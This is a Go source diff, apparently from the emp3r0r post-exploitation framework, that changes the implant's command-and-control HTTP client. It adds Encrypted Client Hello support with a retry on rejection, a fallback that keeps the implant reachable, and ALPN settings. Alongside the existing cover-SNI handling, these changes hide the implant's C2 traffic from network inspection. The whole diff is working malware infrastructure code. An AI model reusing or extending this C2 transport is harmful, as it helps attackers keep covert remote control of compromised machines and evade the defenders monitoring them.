@@ -12,6 +12,7 @@ import (
 	"context"
 	"crypto/tls"
 	"crypto/x509"
+	"errors"
 	"net"
 	"net/http"
 	"net/url"
@@ -29,6 +30,9 @@ func stdlibTLSConfig(c2Host string, rootCAs *x509.CertPool) *tls.Config {
 		RootCAs:          rootCAs,
 		MinVersion:       tls.VersionTLS12,
 		CurvePreferences: []tls.CurveID{tls.CurveP256, tls.X25519},
+		// DialTLSContext is used for the C2 transport, so ALPN must be set
+		// explicitly (the transport cannot add it automatically).
+		NextProtos: []string{"h2", "http/1.1"},
 	}
 	if verifyName != "" {
 		// A cover SNI is configured: send it, but verify the certificate
@@ -93,21 +97,73 @@ func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
 		return &http.Client{Transport: tr}
 	}
 
-	dialContext := (&net.Dialer{Timeout: 10 * time.Second}).DialContext
+	dialContext := func(ctx context.Context, network, addr string) (net.Conn, error) {
+		if GlobalMeshDialer != nil {
+			return GlobalMeshDialer(ctx, network, addr)
+		}
+		return (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, network, addr)
+	}
+	baseTLS := stdlibTLSConfig(c2_host, rootCAs)
 	tr := &http.Transport{
 		Proxy:             proxyFunc,
-		TLSClientConfig:   stdlibTLSConfig(c2_host, rootCAs),
+		TLSClientConfig:   baseTLS,
 		ForceAttemptHTTP2: true,
-		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
-			if GlobalMeshDialer != nil {
-				return GlobalMeshDialer(ctx, network, addr)
-			}
-			return dialContext(ctx, network, addr)
+		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+			return dialStdTLSWithECH(ctx, network, addr, baseTLS, dialContext)
 		},
 	}
 
 	logging.Infof("Transport initialized (%s)", c2url)
 	return &http.Client{Transport: tr}
+}
+
+// dialStdTLSWithECH performs the crypto/tls handshake for the C2 connection,
+// attaching the ECHConfigList when ECH is configured and retrying once with the
+// server's retry config if ECH is rejected. A fetch failure connects without
+// ECH so the implant stays reachable.
+func dialStdTLSWithECH(ctx context.Context, network, addr string, cfg *tls.Config, dial func(context.Context, string, string) (net.Conn, error)) (net.Conn, error) {
+	list, echConfigured, err := echConfigList(ctx)
+	if err != nil {
+		logging.Warningf("ECH is configured but its config could not be fetched; connecting without ECH: %v", err)
+		echConfigured = false
+	}
+	tlsCfg := cfg
+	if echConfigured {
+		tlsCfg = cfg.Clone()
+		// crypto/tls refuses ECH below TLS 1.3.
+		tlsCfg.MinVersion = tls.VersionTLS13
+		tlsCfg.EncryptedClientHelloConfigList = list
+	}
+
+	raw, err := dial(ctx, network, addr)
+	if err != nil {
+		return nil, err
+	}
+	conn := tls.Client(raw, tlsCfg)
+	if err := conn.HandshakeContext(ctx); err != nil {
+		var echErr *tls.ECHRejectionError
+		if echConfigured && errors.As(err, &echErr) && len(echErr.RetryConfigList) > 0 {
+			logging.Warningf("ECH was rejected; retrying with the server-provided ECH config")
+			recordECHRetry(echErr.RetryConfigList)
+			_ = raw.Close()
+			raw, dialErr := dial(ctx, network, addr)
+			if dialErr != nil {
+				return nil, dialErr
+			}
+			retryCfg := cfg.Clone()
+			retryCfg.MinVersion = tls.VersionTLS13
+			retryCfg.EncryptedClientHelloConfigList = echErr.RetryConfigList
+			retryConn := tls.Client(raw, retryCfg)
+			if retryErr := retryConn.HandshakeContext(ctx); retryErr != nil {
+				_ = raw.Close()
+				return nil, retryErr
+			}
+			return retryConn, nil
+		}
+		_ = raw.Close()
+		return nil, err
+	}
+	return conn, nil
 }
 
 // CreatePreflightHTTPClient creates a lightweight HTTPS client for preflight
